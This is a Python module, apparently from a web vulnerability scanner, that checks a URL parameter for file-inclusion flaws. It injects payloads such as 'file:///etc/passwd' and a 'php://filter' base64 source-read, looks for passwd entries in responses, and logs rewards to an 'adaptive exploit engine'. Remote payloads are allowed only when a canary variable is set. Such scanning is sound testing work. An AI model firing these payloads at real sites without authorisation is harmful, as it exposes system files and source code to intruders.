"""Remote File Inclusion (RFI) validator.

This validator is conservative: it will NOT make outbound HTTP requests to
attacker-controlled URLs unless the environment variable ``RFI_CANARY_URL``
is set. By default it tests local include-like payloads (``file:///etc/passwd``,
``php://filter``) and records reward signals via the adaptive engine.
"""
from __future__ import annotations

import os
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import aiohttp

from core.adaptive_exploit_engine import AdaptiveExploitEngine, compute_reward
from .registry import register
from core.local_payload_engine import suggest_payloads

LOCAL_PAYLOADS = [
    "http://127.0.0.1/",
    "file:///etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
]

ERROR_SIGNS = ("root:", "daemon:", "nobody:")


async def _fetch(session: aiohttp.ClientSession, url: str) -> tuple[float, int, str]:
    start = time.monotonic()
    try:
        async with session.get(url, timeout=20) as r:
            body = await r.text(errors="ignore")
            return time.monotonic() - start, r.status, body
    except Exception:
        return 999.0, 0, ""


@register("rfi")
async def validate_rfi(url: str, param: str, timeout: int = 20) -> dict | None:
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    _engine = AdaptiveExploitEngine()

    # baseline
    qs[param] = ["test"]
    baseline_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))

    # decide payloads: allow remote canary only if env var set
    payloads = list(LOCAL_PAYLOADS)
    canary = os.environ.get("RFI_CANARY_URL")
    if canary:
        payloads.append(canary)

    # incorporate suggested payloads but avoid adding remote attacker URLs unless canary present
    suggested = suggest_payloads("rfi", n=10) or []
    for p in suggested:
        if not isinstance(p, str):
            continue
        if p.startswith("file://") or p.startswith("php://") or p.startswith("http://127") or p.startswith("http://localhost"):
            if p not in payloads:
                payloads.append(p)
        elif canary and p.startswith("http"):
            if p not in payloads:
                payloads.append(p)

    async with aiohttp.ClientSession() as session:
        baseline_time, _, baseline_body = await _fetch(session, baseline_url)

        for payload in payloads:
            qs[param] = [payload]
            test_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
            response_time, status_code, body = await _fetch(session, test_url)
            waf = "blocked" if "blocked" in body.lower() else "unknown"

            lowered = body.lower()
            if any(sig in lowered for sig in ERROR_SIGNS):
                _engine.record_result(payload, "rfi", reward=1.0, waf=waf, tech=[])
                return {
                    "validated": True,
                    "type": "RFI",
                    "url": test_url,
                    "param": param,
                    "payload": payload,
                    "evidence": "Local file content reflected in response",
                }

            reward = 0.0 if waf == "blocked" else compute_reward(
                validated=False,
                response_time=response_time,
                baseline_time=baseline_time,
                response_body=body,
                baseline_body=baseline_body,
                status_code=status_code,
                waf_blocked=False,
                payload=payload,
            )
            _engine.record_result(payload, "rfi", reward=reward, waf=waf, tech=[])

    return None
